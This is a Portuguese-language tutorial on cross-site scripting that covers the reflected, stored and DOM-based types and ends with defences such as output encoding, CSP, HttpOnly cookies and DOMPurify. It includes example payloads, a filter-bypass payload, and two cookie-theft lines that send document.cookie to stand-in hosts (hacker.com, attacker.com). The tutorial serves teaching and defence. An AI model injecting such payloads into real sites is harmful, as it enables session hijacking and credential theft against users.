# 💉 XSS (Cross-Site Scripting): Executando Scripts no Alvo

O XSS ocorre quando um atacante consegue injetar código JavaScript malicioso em uma página legítima, que será executado no navegador da vítima. Diferente de outras injeções, o alvo aqui não é o servidor, mas sim o **usuário final**.

## 🚀 Como funciona na prática?
Imagine um campo de "Comentários" que não limpa o que o usuário digita. Se você digitar `<script>alert('Hackeado!')</script>`, qualquer um que ler seu comentário verá o alerta. Em um cenário real, o script roubaria cookies ou redirecionaria o usuário.

## 👺 Os 3 Tipos Principais de Ataque

### 1. 📬 XSS Refletido (Reflected)
O payload é enviado via parâmetro na URL e "reflete" na resposta da página.
- **Vetor**: Links maliciosos enviados por e-mail ou redes sociais.
- **Exemplo**: `http://site.com/search?q=<script>document.location='http://hacker.com/steal?c='+document.cookie</script>`
- **Característica**: Não é persistente; exige que a vítima clique no link.

### 2. 💾 XSS Armazenado (Stored) - O Pesadelo!
O script malicioso é salvo permanentemente no servidor (banco de dados, logs, fóruns).
- **Vetor**: Postagens em redes sociais, perfis de usuário, campos de endereço.
- **Exemplo**: Um atacante altera seu "Nome de Usuário" para um script. Sempre que alguém visualizar o perfil dele, o script executa.
- **Característica**: Afeta múltiplos usuários sem necessidade de interação direta via link.

### 3. 🌳 XSS Baseado em DOM
A vulnerabilidade existe inteiramente no código JavaScript do lado do cliente (client-side).
- **Como ocorre**: O JS lê dados de uma fonte insegura (como `location.hash`) e os escreve na página usando funções perigosas como `innerHTML` ou `eval()`.
- **Característica**: O payload pode nunca chegar ao servidor, tornando-o invisível para alguns WAFs.

## 🧪 Payloads Úteis para Testes:
- **Básico**: `<script>alert(1)</script>`
- **Bypass de Filtro**: `<img src=x onerror=alert(1)>`
- **Roubo de Cookie**: `<script>fetch('https://attacker.com/log?c=' + document.cookie)</script>`
- **Keylogger**: Injetar um script que captura cada tecla digitada e envia para o atacante.

## 🛡️ Estratégias de Defesa (Blue Team)
1. **Saída Segura (Output Encoding)**: Converter caracteres especiais em entidades HTML (ex: `<` vira `&lt;`). Use bibliotecas como OWASP Java Encoder.
2. **CSP (Content Security Policy)**: Um header HTTP que restringe de onde os scripts podem ser carregados e executados.
3. **HttpOnly Flags**: Marcar cookies sensíveis como `HttpOnly` impede que o JavaScript os acesse via `document.cookie`.
4. **Validar e Sanitizar**: Use bibliotecas como `DOMPurify` para limpar HTML vindo de usuários.

---
**Tags:** `XSS`, `JavaScript-Security`, `Client-Side`, `Payloads`, `CSP`, `Session-Hijacking`